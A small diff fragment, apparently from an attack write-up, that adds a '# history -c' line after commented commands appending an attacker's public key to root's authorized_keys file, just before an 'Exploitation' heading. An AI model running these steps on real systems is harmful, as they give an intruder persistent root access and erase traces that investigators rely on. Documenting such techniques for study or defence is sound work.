@@ -20,6 +20,7 @@ In the ssh config
     # mkdir -p /root/.ssh
     # echo '<ATTACKER_PUBLIC_KEY>' >> /root/.ssh/authorized_keys
     # chmod 600 /root/.ssh/authorized_keys
+    # history -c
 
 ### Exploitation 
 
